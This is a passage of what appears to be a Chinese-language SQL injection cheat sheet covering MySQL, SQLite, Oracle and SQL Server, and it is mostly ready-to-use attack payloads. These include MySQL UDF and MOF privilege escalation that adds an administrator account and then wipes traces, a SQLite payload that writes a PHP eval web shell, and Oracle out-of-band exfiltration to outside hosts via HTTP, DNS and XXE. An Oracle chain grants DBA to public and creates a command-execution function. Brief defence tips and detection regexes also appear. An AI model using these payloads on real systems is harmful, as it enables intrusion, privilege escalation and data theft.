+ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致
+
+</code></pre>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h4><p>udf &#x3D; ‘user defined function‘，即‘用户自定义函数’。文件后缀为‘.dll’，常用c语言编写。</p>
+<p>通过在udf文件中定义新函数，对MYSQL的功能进行扩充，可以执行系统任意命令。将MYSQL账号root转化为系统system权限。</p>
+<p>如果是 MySQL &gt;&#x3D; 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。</p>
+<pre><code>#从udf文件中引入自定义函数
+create function sys_eval returns string soname &#39;udf.dll&#39;; 
+//sys_eval是函数名称，udf.dll是lib_mysqludf_sys.dll_上传后的文件名
+
+#执行自定义函数
+新建账号waitalone，密码为waitalone.cn
+select cmdshell(&#39;net user waitalone waitalone.cn /add&#39;); 
+将waitalone加入管理员组
+select cmdshell(&#39;net localgroup administrators waitalone /add&#39;);
+
+#清除痕迹
+drop function cmdshell;     #删除函数
+delete from mysql.func where name=&#39;cmdshell&#39;  #删除函数
+</code></pre>
+<h4 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h4><p>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。提权的原理是C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p>
+<p>传入：</p>
+<p>select 编码文件 into dumpfile “C:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;test.mof”;<br>清理痕迹：</p>
+<pre><code class="bash"># 停止 winmgmt 服务
+net stop winmgmt
+
+# 删除 Repository 文件夹
+rmdir /s /q C:\Windows\system32\wbem\Repository\
+
+# 手动删除 mof 文件
+del C:\Windows\system32\wbem\mof\good\test.mof /F /S
+
+# 删除创建的用户
+net user hacker /delete
+
+# 重新启动服务
+net start winmgmt
+</code></pre>
+<h4 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h4><p>将脚本写入到启动项路径，等待用户重启</p>
+<h4 id="CVE-2016-6663"><a href="#CVE-2016-6663" class="headerlink" title="CVE-2016-6663"></a>CVE-2016-6663</h4><p>竞争条件提权漏洞，一个拥有 CREATE&#x2F;INSERT&#x2F;SELECT 低权限的账户提权成功后可以系统用户身份执行任意代码，提权的用户为 mysql 用户，概括一下就是将低权限的 www-data 权限提升为 mysql 权限</p>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><h5 id="使用参数化过滤语句"><a href="#使用参数化过滤语句" class="headerlink" title="使用参数化过滤语句"></a>使用参数化过滤语句</h5><p>采用了PreparedStatement，就会将sql语句：”select id, no from user where id&#x3D;?” 预先编译好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是什么，都不会影响该sql语句的语法结构了，因为语法分析已经完成了，而语法分析主要是分析sql命令，比如 select ,from ,where ,and, or ,order by 等等。所以即使你后面输入了这些sql命令，也不会被当成sql命令来执行了，因为这些sql命令的执行，必须先得通过语法分析，生成执行计划，既然语法分析已经完成，已经预编译过了，那么后面输入的参数，是绝对不可能作为sql命令来执行的，只会被当做字符串字面值参数。</p>
+<h5 id="严格检查参数的数据类型，还有可以使用一些安全函数"><a href="#严格检查参数的数据类型，还有可以使用一些安全函数" class="headerlink" title="严格检查参数的数据类型，还有可以使用一些安全函数"></a>严格检查参数的数据类型，还有可以使用一些安全函数</h5><h5 id="正则表达式检查sql"><a href="#正则表达式检查sql" class="headerlink" title="正则表达式检查sql"></a>正则表达式检查sql</h5><p>具体的正则表达式：<br>检测SQL meta-characters的正则表达式 ：&#x2F;(%27)|(\’)|(--)|(%23)|(#)&#x2F;ix<br>修正检测SQL meta-characters的正则表达式 ：&#x2F;((%3D)|(&#x3D;))[^\n]<em>((%27)|(\’)|(--)|(%3B)|(:))&#x2F;i<br>典型的SQL 注入攻击的正则表达式 ：&#x2F;\w</em>((%27)|(\’))((%6F)|o|(%4F))((%72)|r|(%52))&#x2F;ix<br>检测SQL注入，UNION查询关键字的正则表达式 ：&#x2F;((%27)|(\’))union&#x2F;ix(%27)|(\’)<br>检测MS SQL Server SQL注入攻击的正则表达式：&#x2F;exec(\s|+)+(s|x)p\w+&#x2F;ix</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10594">https://xz.aliyun.com/t/10594</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html#toc-heading-31">https://www.sqlsec.com/2020/11/mysql.html#toc-heading-31</a></p>
+<h2 id="sqlite利用"><a href="#sqlite利用" class="headerlink" title="sqlite利用"></a>sqlite利用</h2><p>sqlite和mysql等还是有些区别的，sqlite的每一个数据库就是一个文件。</p>
+<h3 id="联合查询-1"><a href="#联合查询-1" class="headerlink" title="联合查询"></a>联合查询</h3><pre><code>1&#39; order by 3;     //使用order by确定查询字段数
+0&#39; union select 1,2,3;
+0&#39; union select 1,2,sql from sqlite_master;                   
+0&#39; union select 1,2,sql from sqlite_master where type=&#39;table&#39;;      //查表名
+0&#39; union select 1,2,sql from sqlite_master where type=&#39;table&#39; and name=&#39;user_data&#39;;  //查字段名
+</code></pre>
+<p>多条结果：</p>
+<pre><code>0&#39; union select 1,2,group_concat(tbl_name) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; --
+或者使用limit来输出一行结果
+0&#39; union select 1,2,tbl_name FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; limit 2 offset 1 --
+</code></pre>
+<p>似乎无法通过sqlite的语句查看有哪些数据库，可以通过命令行查看文件知道</p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h5 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>与mysql基本相同</p>
+<pre><code>select * from test where id =1 union select 1,length(sqlite_version())=6	//判断数据库版本长度
+select * from test where id=1 and substr(sqlite_version(),1,1)=&#39;3&#39;		//判断数据库版本第一个字符是否为3
+</code></pre>
+<h5 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>sqlite没有sleep()函数，但是有个函数randomblob(N)，作用是返回一个 N 字节长的包含伪随机字节的 BLOG。 N 是正整数。可以用它来制造延时。</p>
+<p>而且sqlite没有if函数，可以使用case来构造条件</p>
+<pre><code>select * from test where id=1 and 1=(case when(substr(sqlite_version(),1,1)=&#39;3&#39;) then randomblob(1000000000) else 0 end);
+</code></pre>
+<h3 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h3><p>由于sqlite数据库即文件的特点，我们可以创建新数据库，在新数据库建表插入payload</p>
+<p>ATTACH DATABASE命令</p>
+<p>假设这样一种情况，当在同一时间有多个数据库可用，您想使用其中的任何一个。SQLite 的 ATTACH DATABASE 语句是用来选择一个特定的数据库，使用该命令后，所有的 SQLite 语句将在附加的数据库下执行</p>
+<p>payload：</p>
+<pre><code>&#39;;ATTACH DATABASE &#39;/var/www/html/sqlite_test/shell.php&#39; AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES (&#39;&lt;?php @eval($_POST[&quot;x&quot;]); ?&gt;&#39;); --
+</code></pre>
+<h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><p>Perl<code>和 </code>PHP&#96; 中可以对用户输入的数据进行转义从而来防止 SQL 注入</p>
+<p>PHP 中可以使用 <code>PHP_PDO</code> 的 <code>PDO:prepare()</code> 方法来预处理 SQL 语句，然后使用 <code>PDOStatement::bindParam()</code> 方法绑定参数，或者在 <code>PDOStatement::execute()</code> 传入参数来预防 SQL 注入</p>
+<h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8627#toc-6">https://xz.aliyun.com/t/8627#toc-6</a></p>
+<h2 id="oracle利用"><a href="#oracle利用" class="headerlink" title="oracle利用"></a>oracle利用</h2><p>Oracle和MySQL数据库语法大致相同，结构不太相同。<strong>最大的一个特点就是oracle可以调用Java代码。</strong></p>
+<p>对于“数据库”这个概念而言，Oracle采用了”表空间“的定义。数据文件就是由多个表空间组成的，这些数据文件和相关文件形成一个完整的数据库。当数据库创建时，Oracle 会默认创建五个表空间：SYSTEM、SYSAUX、USERS、UNDOTBS、TEMP：</p>
+<ol>
+<li>SYSTEM：看名字就知道这个用于是存储系统表和管理配置等基本信息</li>
+<li>SYSAUX：类似于 SYSTEM，主要存放一些系统附加信息，以便减轻 SYSTEM 的空间负担</li>
+<li>UNDOTBS：用于事务回退等</li>
+<li>TEMP：作为缓存空间减少内存负担</li>
+<li>USERS：就是存储我们定义的表和数据</li>
+</ol>
+<p>在Oracle中每个表空间中均存在一张dual表，这个表是虚表，并没有实际的存储意义，它永远只存储一条数据，因为Oracle的SQL语法要求select后必须跟上from，所以我们通常使用dual来作为计算、查询时间等SQL语句中from之后的虚表占位，也就是<code>select 1+1 from dual</code>。</p>
+<p>再来看Oracle中用户和权限划分：Oracle 中划分了许多用户权限，权限的集合称为角色。例如 CONNECT 角色具有连接到数据库权限，RESOURCE 能进行基本的增删改查，DBA 则集合了所有的用户权限。在创建数据库时，会默认启用 sys、system 等用户：</p>
+<ol>
+<li>sys：相当于 Linux 下的 root 用户。为 DBA 角色</li>
+<li>system：与 sys 类似，但是相对于 sys 用户，无法修改一些关键的系统数据，这些数据维持着数据库的正常运行。为 DBA 角色。</li>
+<li>public：public 代指所有用户（everyone），对其操作会应用到所有用户上（实际上是所有用户都有 public 用户拥有的权限，如果将 DBA 权限给了 public，那么也就意味着所有用户都有了 DBA 权限）</li>
+</ol>
+<p>Oracle的系统表：</p>
+<ul>
+<li>dba_tables : 系统里所有的表的信息，需要DBA权限才能查询</li>
+<li>all_tables : 当前用户有权限的表的信息</li>
+<li>user_tables: 当前用户名下的表的信息</li>
+<li>DBA_ALL_TABLES：DBA 用户所拥有的或有访问权限的对象和表</li>
+<li>ALL_ALL_TABLES：某一用户拥有的或有访问权限的对象和表</li>
+<li>USER_ALL_TABLES：某一用户所拥有的对象和表</li>
+</ul>
+<p><strong>DBA_TABLES &gt;&#x3D; ALL_TABLES &gt;&#x3D; USER_TABLES</strong></p>
+<pre><code>SELECT banner FROM v$version WHERE banner LIKE &#39;Oracle%25&#39;		//获取数据库版本信息
+
+SELECT banner FROM v$version where banner like &#39;TNS%25&#39;		//获取操作系统版本信息
+
+SELECT name FROM v$database		//获取当前数据库
+
+SELECT user FROM dual;	//获取数据库用户
+
+SELECT username FROM all_users;		//获取所有数据库用户
+
+SELECT * FROM session_privs	//获取当前用户权限
+
+SELECT DISTINCT owner, table_name FROM all_tables		//获取当前用户有权限的所有数据库
+
+SELECT column_name FROM all_tab_columns		//获取字段名
+</code></pre>
+<h3 id="联合查询-2"><a href="#联合查询-2" class="headerlink" title="联合查询"></a>联合查询</h3><p>order by 猜字段数量，union select进行查询，需要注意的是每一个字段都需要对应前面select的数据类型(字符串&#x2F;数字)。所以我们一般先使用null字符占位，然后逐位判断每个字段的类型，</p>
+<pre><code>admin&#39; union select 1,&#39;asd&#39;,null from dual --		//若正常说明四个字段，第一个字符型第二个数字型
+
+admin&#39; union select 1,(SELECT global_name FROM global_name),null from dual --		// 
+
+查当前数据库
+
+admin&#39; union select 1,(select LISTAGG(table_name,&#39;,&#39;)within group(order by owner)name from all_tables where owner=&#39;SYSTEM&#39;),null from dual -- 		//查表，wmsys.wm_concat()等同于MySQL中的group_concat()，在11gr2和12C上已经抛弃，可以用LISTAGG()替代。但是LISTAGG()返回的是varchar类型，如果数据表很多会出现字符串长度过长的问题。这个时候可以使用通过字符串截取来进行
+
+admin&#39; union select 1,(select column_name from all_tab_columns where table_name=&#39;TEST&#39; and rownum=2),null from dual -- 		//查字段
+</code></pre>
+<h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="utl-inaddr-get-host-name"><a href="#utl-inaddr-get-host-name" class="headerlink" title="utl_inaddr.get_host_name"></a>utl_inaddr.get_host_name</h4><pre><code class="sql">select utl_inaddr.get_host_name((select user from dual)) from dual;
+</code></pre>
+<p>11g之后，使用此函数的数据库用户需要有访问网络的权限</p>
+<h4 id="ctxsys-drithsx-sn"><a href="#ctxsys-drithsx-sn" class="headerlink" title="ctxsys.drithsx.sn"></a>ctxsys.drithsx.sn</h4><pre><code class="sql">select ctxsys.drithsx.sn(1, (select user from dual)) from dual;
+</code></pre>
+<p>处理文本的函数，参数错误时会报错。</p>
+<h4 id="CTXSYS-CTX-REPORT-TOKEN-TYPE"><a href="#CTXSYS-CTX-REPORT-TOKEN-TYPE" class="headerlink" title="CTXSYS.CTX_REPORT.TOKEN_TYPE"></a>CTXSYS.CTX_REPORT.TOKEN_TYPE</h4><pre><code class="sql">select CTXSYS.CTX_REPORT.TOKEN_TYPE((select user from dual), &#39;123&#39;) from dual;
+</code></pre>
+<h4 id="XMLType"><a href="#XMLType" class="headerlink" title="XMLType"></a>XMLType</h4><pre><code class="fallback">admin&#39; and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --
+</code></pre>
+<p>注意url编码，如果返回的数据有空格的话，它会自动截断，导致数据不完整，这种情况下先转为 hex，再导出</p>
+<h4 id="dbms-xdb-version-checkin"><a href="#dbms-xdb-version-checkin" class="headerlink" title="dbms_xdb_version.checkin"></a>dbms_xdb_version.checkin</h4><pre><code class="sql">select dbms_xdb_version.checkin((select user from dual)) from dual;
+</code></pre>
+<h4 id="dbms-xdb-version-makeversioned"><a href="#dbms-xdb-version-makeversioned" class="headerlink" title="dbms_xdb_version.makeversioned"></a>dbms_xdb_version.makeversioned</h4><pre><code class="sql">select dbms_xdb_version.makeversioned((select user from dual)) from dual;
+</code></pre>
+<h4 id="dbms-xdb-version-uncheckout"><a href="#dbms-xdb-version-uncheckout" class="headerlink" title="dbms_xdb_version.uncheckout"></a>dbms_xdb_version.uncheckout</h4><pre><code class="sql">select dbms_xdb_version.uncheckout((select user from dual)) from dual;
+</code></pre>
+<h4 id="dbms-utility-sqlid-to-sqlhash"><a href="#dbms-utility-sqlid-to-sqlhash" class="headerlink" title="dbms_utility.sqlid_to_sqlhash"></a>dbms_utility.sqlid_to_sqlhash</h4><pre><code class="sql">SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual;
+</code></pre>
+<h4 id="ordsys-ord-dicom-getmappingxpath"><a href="#ordsys-ord-dicom-getmappingxpath" class="headerlink" title="ordsys.ord_dicom.getmappingxpath"></a>ordsys.ord_dicom.getmappingxpath</h4><pre><code class="sql">select ordsys.ord_dicom.getmappingxpath((select user from dual), 1, 1) from dual;
+</code></pre>
+<h4 id="UTL-INADDR-get-host-name"><a href="#UTL-INADDR-get-host-name" class="headerlink" title="UTL_INADDR.get_host_name"></a>UTL_INADDR.get_host_name</h4><p>版本：11g以后</p>
+<pre><code class="sql">select UTL_INADDR.get_host_name((select user from dual)) from dual;
+</code></pre>
+<h4 id="UTL-INADDR-get-host-address"><a href="#UTL-INADDR-get-host-address" class="headerlink" title="UTL_INADDR.get_host_address"></a>UTL_INADDR.get_host_address</h4><pre><code class="sql">select UTL_INADDR.get_host_name(&#39;~&#39;||(select user from dual)||&#39;~&#39;) from dual;
+</code></pre>
+<h3 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h3><h4 id="布尔盲注-2"><a href="#布尔盲注-2" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>字符串比较</p>
+<pre><code class="sql">admin&#39; and (select substr(user, 1, 1) from dual)=&#39;S&#39; --
+</code></pre>
+<p>decode配合除数0</p>
+<pre><code class="sql">admin&#39; and 1=(select decode(substr(user, 1, 1), &#39;S&#39;, (1/1),0) from dual) -
+</code></pre>
+<h4 id="时间盲注-2"><a href="#时间盲注-2" class="headerlink" title="时间盲注"></a>时间盲注</h4><p> DBMS_PIPE.RECEIVE_MESSAGE(‘任意值’,延迟时间)</p>
+<pre><code class="sql">select 1 from dual where DBMS_PIPE.RECEIVE_MESSAGE(&#39;asd&#39;, REPLACE((SELECT substr(user, 1, 1) FROM dual), &#39;S&#39;, 10))=1;
+</code></pre>
+<p>decode()与高耗时SQL操作的组合</p>
+<pre><code class="sql">and 1=(select decode(substr(user,1,1),&#39;B&#39;,(select count(*) from all_objects),0) from dual)--+
+</code></pre>
+<h3 id="外代查询"><a href="#外代查询" class="headerlink" title="外代查询"></a>外代查询</h3><h4 id="utl-http-request"><a href="#utl-http-request" class="headerlink" title="utl_http.request"></a>utl_http.request</h4><p>需要出外网HTTP</p>
+<pre><code>http://xxx.xxx.xx.xx/xxx/selcet?suser=1&amp;sname=1&#39;  and 1=utl_http.request(&#39;http://XXXXXXXXXXX/&#39;||(select banner from sys.v_$version where rownum=1)) --
+</code></pre>
+<p>11g之后需要网络访问权限</p>
+<h4 id="utl-inaddr-get-host-address"><a href="#utl-inaddr-get-host-address" class="headerlink" title="utl_inaddr.get_host_address"></a>utl_inaddr.get_host_address</h4><p>dns解析带外</p>
+<pre><code>http://xxx.xxx.xx.xx/xxx/selcet?suser=1&amp;sname=1&#39; and (select utl_inaddr.get_host_address((select user from dual)||&#39;.xxx.xxx&#39;) from dual)is not null--
+</code></pre>
+<p>11g之后需要网络访问权限</p>
+<h4 id="SYS-DBMS-LDAP-INIT"><a href="#SYS-DBMS-LDAP-INIT" class="headerlink" title="SYS.DBMS_LDAP.INIT"></a>SYS.DBMS_LDAP.INIT</h4><p>这个函数在 10g&#x2F;11g 中是 public 权限.</p>
+<pre><code class="sql">SELECT DBMS_LDAP.INIT((select user from dual)||&#39;.24wypw.dnslog.cn&#39;,80) FROM DUAL;
+</code></pre>
+<h4 id="HTTPURITYPE"><a href="#HTTPURITYPE" class="headerlink" title="HTTPURITYPE"></a>HTTPURITYPE</h4><pre><code class="sql">SELECT HTTPURITYPE((select user from dual)||&#39;.24wypw.dnslog.cn&#39;).GETCLOB() FROM DUAL;
+</code></pre>
+<h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p>如果 Oracle 版本 &lt;&#x3D; 10g，可以尝试以下函数：</p>
+<ol>
+<li>UTL_INADDR.GET_HOST_ADDRESS</li>
+<li>UTL_HTTP.REQUEST</li>
+<li>HTTP_URITYPE.GETCLOB</li>
+<li>DBMS_LDAP.INIT and UTL_TCP</li>
+</ol>
+<h3 id="XXE-CVE-2014-6577"><a href="#XXE-CVE-2014-6577" class="headerlink" title="XXE (CVE-2014-6577)"></a>XXE (CVE-2014-6577)</h3><p>受影响版本：11.2.0.3, 11.2.0.4, 12.1.0.1 和12.1.0.2</p>
+<p>所需权限：创建会话（CREATE SESSION）</p>
+<p>http</p>
+<pre><code class="sql">select 1 from dual where 1=(select extractvalue(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://192.168.124.1/&#39;||(SELECT user from dual)||&#39;&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) from dual); 
+</code></pre>
+<p>ftp</p>
+<pre><code class="sql">select extractvalue(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;ftp://&#39;||user||&#39;:bar@IP/test&quot;&gt; %remote; %param1;]&gt;&#39;),&#39;/l&#39;) from dual;
+</code></pre>
+<h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><h4 id="GET-DOMAIN-INDEX-TABLES函数注入"><a href="#GET-DOMAIN-INDEX-TABLES函数注入" class="headerlink" title="GET_DOMAIN_INDEX_TABLES函数注入"></a>GET_DOMAIN_INDEX_TABLES函数注入</h4><p>影响版本:Oracle 8.1.7.4, 9.2.0.1 - 9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2</p>
+<p>漏洞的成因是该函数的参数存在注入，而该函数的所有者是sys，所以通过注入就可以执行任意sql，该函数的执行权限为public，所以只要遇到一个oracle的注入点并且存在这个漏洞的，基本上都可以提升到最高权限。</p>
+<pre><code>提权
+
+admin&#39; and (SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS _OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;grant dba to public&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0)) is not null--
+
+创建Java代码执行命令
+
+admin&#39; and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace and compile java source named &quot;Command&quot; as import java.io.*;public class Command&#123;public static String exec(String cmd) throws Exception&#123;String sb=&quot;&quot;;BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());BufferedReader inBr = new BufferedReader(new InputStreamReader(in));String lineStr;while ((lineStr = inBr.readLine()) != null)sb+=lineStr+&quot;\n&quot;;inBr.close();in.close();return sb;&#125;&#125;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual) is not null --
+
+赋予Java执行权限
+
+admin&#39; and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;begin dbms_java.grant_permission( &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;PUBLIC&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;SYS:java.io.FilePermission&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&lt;&lt;ALL FILES&gt;&gt;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;execute&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; );end;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual) is not null --
+
+创建函数
+
+admin&#39; and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace function cmd(p_cmd in varchar2) return varchar2 as language java name &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;Command.exec(java.lang.String) return String&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;; &#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual) is not null --
+
+赋予函数执行权限
+
+admin&#39; and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;grant all on cmd to public&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual) is not null--
+
+执行命令
+
+admin&#39; and (select sys.cmd(&#39;cmd.exe /c whoami&#39;) from dual) is not null--
+</code></pre>
+<h4 id="DBMS-JVM-EXP-PERMS绕过JVM执行命令"><a href="#DBMS-JVM-EXP-PERMS绕过JVM执行命令" class="headerlink" title="DBMS_JVM_EXP_PERMS绕过JVM执行命令"></a>DBMS_JVM_EXP_PERMS绕过JVM执行命令</h4><p>需具有创建会话权限，windows系统</p>
+<p>影响版本：10gR2、11gR1 和 11gR2 </p>
+<pre><code>SQL&gt; CONNECT / AS SYSDBA
+Connected.
+SQL&gt; CREATE USER Test IDENTIFIED BY Test;
+
+User created.
+
+SQL&gt; GRANT CREATE SESSION TO Test;
+
+Grant succeeded.
+
+SQL&gt; SELECT TYPE_NAME, NAME, ACTION FROM DBA_JAVA_POLICY WHERE GRANTEE = ‘TEST’;
+
+no rows selected
+
+SQL&gt; CONNECT Test/test
+Connected.
+
+SQL&gt; DECLARE
+   POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
+   CURSOR C1 IS SELECT
+‘GRANT’,’GREMLIN’,’SYS’,’java.io.FilePermission’,&#39;&lt;FILES&gt;&gt;’,’execute’,’ENABLED’ FROM DUAL; 
+  BEGIN
+  OPEN C1;
+  FETCH C1 BULK COLLECT INTO POL;
+  CLOSE C1;
+  DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
+  END;
+  /
+
+PL/SQL procedure successfully completed.
+
+SQL&gt; CONNECT / AS SYSDBA
+Connected.
+
+SQL&gt; COL TYPE_NAME FOR A30;
+SQL&gt; COL NAME FOR A30;
+SQL&gt; COL ACTION FOR A10;
+SQL&gt; SELECT TYPE_NAME, NAME, ACTION FROM DBA_JAVA_POLICY WHERE GRANTEE = ‘TEST’;
+
+TYPE_NAME                      NAME                           ACTION
+—————————— —————————— ———-
+java.io.FilePermission         &lt;&gt;                  execute
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/33601">https://www.exploit-db.com/exploits/33601</a></p>
+<h4 id="xml反序列化绕过JVM执行命令-CVE-2018-3004"><a href="#xml反序列化绕过JVM执行命令-CVE-2018-3004" class="headerlink" title="xml反序列化绕过JVM执行命令 CVE-2018-3004"></a>xml反序列化绕过JVM执行命令 CVE-2018-3004</h4><p>如果当前数据库用户具有connect和resource权限，则可以尝试使用反序列化来进行执行命令。Oracle Enterprise Edition 有一个嵌入数据库的Java虚拟机，而Oracle数据库则通过Java存储过程来支持Java的本地执行。</p>
+<p>看不懂</p>
+<p><a target="_blank" rel="noopener" href="http://obtruse.syfrtext.com/2018/07/oracle-privilege-escalation-via.html">http://obtruse.syfrtext.com/2018/07/oracle-privilege-escalation-via.html</a></p>
+<h3 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h3><p>1.永远不要信任用户的输入。对用户的输入进行校验，可以通过 正则表达式，或限制长度；对单引号和<br>双”-“进行转换等。<br>2.永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用 存储过程进行数据查询存取。<br>3.永远不要使用 管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。<br>4.不要把机密信息直接存放，加密或者hash掉密码和敏感的信息。<br>5.应用的异常信息应该给出尽可能少的提示，最好使用自定义的 错误信息对原始错误信息进行包装<br>6.sql注入的检测方法一般采取辅助 软件或网站平台来检测，软件一般采用sql注入检测工具jsky，网站平台就有亿思 网站安全平台检测工具。MDCSOFT SCAN等。采用 MDCSOFT-IPS可以有效的防御SQL注入，XSS攻击等。</p>
+<h2 id="SQL-Server（MSsql）利用"><a href="#SQL-Server（MSsql）利用" class="headerlink" title="SQL Server（MSsql）利用"></a>SQL Server（MSsql）利用</h2><p>对与mssql有三个权限，</p>
+<p>sa（最高权限，相当于system），</p>
+<p>db（文件管理，数据库操作等等，相当于user-administrator），</p>
+<p>public（数据库操作权限，相当于guest-users）</p>
+<p>MSSQL的系统自带库–&gt;master</p>
+<p>​    在MSSQL中每个库都有一个系统自带表–&gt;sysobjects</p>
+<p>​    此系统表中对我们有用的只有3个字段，NAME字段和XTYPE字段和ID字段，name就是表名信息，xtype是代表表的类型，只有两个参数，S代表系统自带表，U代表用户创建的表，id字段的值用来连接</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="判断是否为mssql"><a href="#判断是否为mssql" class="headerlink" title="判断是否为mssql"></a>判断是否为mssql</h4><pre><code class="javascript">?id=1 and (select count(*) from sysobjects)&gt;0
+</code></pre>
+<h4 id="判断权限"><a href="#判断权限" class="headerlink" title="判断权限"></a>判断权限</h4><pre><code class="javascript">and 1=(select IS_SRVROLEMEMBER(&#39;sysadmin&#39;));--
+and 1=(select IS_SRVROLEMEMBER(&#39;serveradmin&#39;));--
+and 1=(select IS_SRVROLEMEMBER(&#39;setupadmin&#39;));--
